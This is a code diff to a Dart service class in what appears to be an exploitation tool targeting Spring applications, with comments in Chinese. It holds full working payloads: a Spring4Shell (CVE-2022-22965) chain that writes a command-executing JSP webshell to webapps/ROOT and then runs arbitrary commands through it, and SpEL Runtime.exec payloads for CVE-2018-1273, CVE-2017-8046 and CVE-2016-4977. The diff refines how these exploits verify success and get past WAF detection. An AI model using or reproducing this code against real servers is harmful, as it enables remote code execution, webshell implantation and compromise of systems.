@@ -2,6 +2,7 @@ import 'package:http/http.dart' as http;
 import 'dart:convert';
 import 'dart:math';
 
+import '../core/exploit_error.dart';
 import 'services/exp_result.dart';
 import 'services/waf_detect.dart';
 
@@ -152,6 +153,18 @@ class SpringExpService {
         );
       }
 
+      // 回显守卫：SpEL 表达式本身含 getRuntime / Scanner 等关键字，
+      // 被服务端原样吐回来时不能算"表达式被执行"。
+      final echoBody = detect.body.toLowerCase();
+      if (echoBody.contains('routing-expression') ||
+          echoBody.contains('java.util.scanner') ||
+          echoBody.contains('spring.cloud.function.routing')) {
+        return ExpResult.probeFailed(
+          name,
+          '响应疑似回显了我们的 SpEL 表达式，无法判定',
+        );
+      }
+
       // 兼容部分部署：错误页直接回显 SpEL 类名/表达式。
       final lower = detect.body.toLowerCase();
       final indicators = <String>[
@@ -182,46 +195,70 @@ class SpringExpService {
   }
 
   // CVE-2022-22965 (Spring4Shell): ClassLoader 写 Webshell
+  //
+  // 实测结论（vulhub spring CVE-2022-22965）：
+  //   AccessLogValve 的 prefix/suffix/pattern **只在第一次写入时生效**，
+  //   之后再改 prefix 仍会写到第一个文件名上。因此 check 与 exec 必须共用
+  //   同一个文件名，否则 exec 永远拿到自己的 404。
+  //   这里让 check 直接写"能执行命令"的 JSP，并用 `cmd=echo marker` 验证，
+  //   让 check 声称的能力（RCE）与它实际验证的东西一致。
+  static const _s22965Shell = 'm4xm';
+
+  static const _s22965Headers = {
+    'suffix': '%>',
+    'c1': 'Runtime',
+    'c2': '<%',
+  };
+
+
+
   Future<ExpResult> checkSpring4Shell() async {
     try {
-      final marker = DateTime.now().millisecondsSinceEpoch.toString();
-      final rnd = Random().nextInt(90000) + 10000;
-      final shellName = 'm4x_${rnd}.jsp';
-      final writeUrl = '${baseUri}?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22m4x%22.equals(request.getParameter(%22k%22)))%7Bout.print(%22$marker%22);%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=m4x_$rnd&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=';
-      await http.get(Uri.parse(writeUrl), headers: {
-        'suffix': '%>',
-        'c1': 'Runtime',
-        'c2': '<%',
-        'DNT': '1',
-      }).timeout(timeout);
-      // Tomcat 的 AccessLogValve 要等下一次请求被记录才真正落盘，且 JSP 首次编译
-      // 与文件追加存在竞争；刚启动的实例尤其慢。先发一个无意义请求触发一次日志，
-      // 再轮询（最多约 20 秒）。
-      await http.get(baseUri).timeout(timeout);
+      final ts = DateTime.now().millisecondsSinceEpoch;
+      final marker = 'MX22965$ts';
+      final writeUrl = '${baseUri}?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))%21%3D-1)%7B%20out.println(new%20String(b%2C0%2Ca))%3B%20%7D%20%7D%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=$_s22965Shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=';
+      final writeRes = await http.get(
+        Uri.parse(writeUrl),
+        headers: {..._s22965Headers, 'DNT': '1'},
+      ).timeout(timeout);
+      final writeBlocked =
+          wafBlockedResult('CVE-2022-22965', writeRes.statusCode, writeRes.body);
+      if (writeBlocked != null) return writeBlocked;
+      // 触发一次访问日志，然后再轮询（JSP 首次编译 + 落盘延迟，实测可达十几秒）。
+      await http.get(baseUri, headers: _s22965Headers).timeout(timeout);
       for (var attempt = 0; attempt < 8; attempt++) {
         await Future<void>.delayed(Duration(seconds: attempt == 0 ? 3 : 2));
-        var verify = await http
-            .get(Uri.parse('${baseUri}$shellName?k=m4x'))
-            .timeout(timeout);
-        if (verify.statusCode == 401 || verify.statusCode == 403) {
-          verify = await http.get(
-            Uri.parse('${baseUri}$shellName?k=m4x'),
-            headers: {'Authorization': _buildAuthHeader()},
-          ).timeout(timeout);
-        }
-        if (verify.statusCode == 200 && verify.body.contains(marker)) {
+        // printf 拆分：URL 里是 "MX22965%s <ts>"，只有执行成功才拼出完整 marker
+        final verify = await _get22965(
+          'cmd=${Uri.encodeComponent('printf MX22965%s $ts')}',
+        );
+        if (verify == null) continue;
+        if (verify.body.contains(marker)) {
           return ExpResult(
             true,
             'CVE-2022-22965 (Spring4Shell)',
-            '可利用：成功写入并回显验证文件 $shellName',
+            '可利用：写入 $_s22965Shell.jsp 并执行命令回显验证通过',
           );
         }
-        if (verify.statusCode == 404) continue;
       }
     } catch (e) {
       return ExpResult.probeFailed('CVE-2022-22965 (Spring4Shell)', '探测失败: $e');
     }
     return ExpResult(false, 'CVE-2022-22965 (Spring4Shell)', '');
+  }
+
+  /// 读取 Spring4Shell 的 JSP；401/403 时补 Basic Auth 再试一次。
+  Future<http.Response?> _get22965(String query) async {
+    final url = '${baseUri}$_s22965Shell.jsp?pwd=j&$query';
+    var res = await http.get(Uri.parse(url), headers: _s22965Headers).timeout(timeout);
+    if (res.statusCode == 401 || res.statusCode == 403) {
+      res = await http.get(
+        Uri.parse(url),
+        headers: {..._s22965Headers, 'Authorization': _buildAuthHeader()},
+      ).timeout(timeout);
+    }
+    if (res.statusCode != 200) return null;
+    return res;
   }
 
   // CVE-2018-1273: Spring Data Commons SpEL via username field
@@ -230,6 +267,10 @@ class SpringExpService {
       const expr = '#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")';
       final payload = _buildSpringDataCommonsFormByExpr(expr);
       final res = await _postSpringDataCommonsForm(payload);
+
+      final dcBlocked =
+          wafBlockedResult('CVE-2018-1273', res.statusCode, res.body);
+      if (dcBlocked != null) return dcBlocked;
 
       final lower = res.body.toLowerCase();
       // 只认强特征：SpEL 求值痕迹，或 Data Commons 绑定失败时暴露的
@@ -288,22 +329,26 @@ class SpringExpService {
 
       const exploitBody = '[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{105,100}))/lastname", "value": "vulhub" }]';
       final first = await sendPatch(exploitBody);
+      final restBlocked =
+          wafBlockedResult('CVE-2017-8046', first.statusCode, first.body);
+      if (restBlocked != null) return restBlocked;
 
       bool hasStrongSignal(http.Response res) {
         final text = '${res.body}\n${res.headers['content-type'] ?? ''}'.toLowerCase();
+        // 实测踩过的坑（同类问题在 WebLogic / XXL-JOB 上都犯过）：
+        // 'json-patch'、'json patch' 这类词会出现在 Spring 自己的
+        // 415 "content type not supported" 页面里 → 任何 Spring 应用都误报。
+        // 只认"SpEL 真的被求值"才会出现的信号。
         final words = <String>[
-          'spel',
           'spellevaluationexception',
           'org.springframework.expression',
-          'el10',
-          'unixprocess',
-          'processbuilder',
           'could not read an object of type',
-          'json-patch',
-          'json patch',
+          'unixprocess',
         ];
         final hasWord = words.any(text.contains);
-        final hasElCode = RegExp(r'EL\d{4}E', caseSensitive: false).hasMatch(res.body);
+        // EL1008E / EL1004E …：只有表达式求值阶段才会出现的错误码
+        final hasElCode =
+            RegExp(r'EL\d{4}E', caseSensitive: false).hasMatch(res.body);
         return hasWord || hasElCode;
       }
 
@@ -331,13 +376,16 @@ class SpringExpService {
         Future<ExpResult?> eval(http.StreamedResponse streamed) async {
           final location = streamed.headers['location'] ?? '';
           final body = await streamed.stream.bytesToString();
-          if (body.contains('54289') || location.contains('54289') || location.contains(Uri.encodeComponent('54289'))) {
-            return ExpResult(true, 'CVE-2016-4977', 'Spring Security OAuth SpEL 注入，233*233=54289 验证通过');
+          final oauthBlocked =
+              wafBlockedResult('CVE-2016-4977', streamed.statusCode, body);
+          if (oauthBlocked != null) return oauthBlocked;
+          if (body.contains('57600') || location.contains('57600') || location.contains(Uri.encodeComponent('57600'))) {
+            return ExpResult(true, 'CVE-2016-4977', 'Spring Security OAuth SpEL 注入，240*240=57600 验证通过');
           }
           return null;
         }
 
-        final first = await _sendOauthAuthorize(client, responseType: r'${233*233}');
+        final first = await _sendOauthAuthorize(client, responseType: r'${240*240}');
         final hit1 = await eval(first);
         if (hit1 != null) {
           return hit1;
@@ -346,7 +394,7 @@ class SpringExpService {
         if (first.statusCode == 401 || first.statusCode == 403) {
           final second = await _sendOauthAuthorize(
             client,
-            responseType: r'${233*233}',
+            responseType: r'${240*240}',
             authHeader: _buildAuthHeader(),
           );
           final hit2 = await eval(second);
@@ -513,7 +561,22 @@ class SpringExpService {
         },
         body: 'test',
       ).timeout(timeout);
-      return res.body.isNotEmpty ? res.body : null;
+      final body = res.body;
+      // 实测：该镜像把 server.error.include-message 关了，命令输出没有任何回显通道，
+      // 响应永远是 Spring 的默认错误 JSON（status 500）。把它当"命令输出"返回，
+      // 用户会看到一坨 JSON 以为执行成功。
+      final looksLikeSpringError = body.contains('"status":500') &&
+          body.contains('"path":"/functionRouter"');
+      if (looksLikeSpringError) {
+        throw const ExploitNotWorking(
+          'SCF 命令已执行但无回显（server.error.include-message 关闭），请改用反向 shell',
+        );
+      }
+      return body.isNotEmpty ? body : null;
+    } on ExploitNotWorking {
+      rethrow;
+    } on ExploitBlocked {
+      rethrow;
     } catch (_) {
       return null;
     }
@@ -548,19 +611,22 @@ class SpringExpService {
   // Spring4Shell: 写入 Webshell 再执行
   Future<String?> execSpring4Shell(String cmd) async {
     try {
-      final writeUrl = '${baseUri}?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=';
-      await http.get(Uri.parse(writeUrl), headers: {
-        'suffix': '%>',
-        'c1': 'Runtime',
-        'c2': '<%',
-      }).timeout(timeout);
-      await Future.delayed(const Duration(seconds: 1));
-      final execUrl = '${baseUri}tomcatwar.jsp?pwd=j&cmd=${Uri.encodeComponent(cmd)}';
-      final res = await http.get(Uri.parse(execUrl)).timeout(timeout);
-      if (res.statusCode == 200 && res.body.isNotEmpty) {
-        return res.body;
+      // 与 check 共用 $_s22965Shell.jsp（valve 只认第一次写入的 prefix）。
+      for (var i = 0; i < 10; i++) {
+        await Future<void>.delayed(Duration(seconds: i == 0 ? 1 : 1));
+        final res = await _get22965('cmd=${Uri.encodeComponent(cmd)}');
+        if (res == null) continue;
+        final body = res.body;
+        if (body.trim().isEmpty) continue;
+        return body;
       }
-      return null;
+      throw const ExploitNotWorking(
+        'Spring4Shell：JSP 未落地或不可执行（valve 需先由 check 写入）',
+      );
+    } on ExploitNotWorking {
+      rethrow;
+    } on ExploitBlocked {
+      rethrow;
     } catch (_) {
       return null;
     }
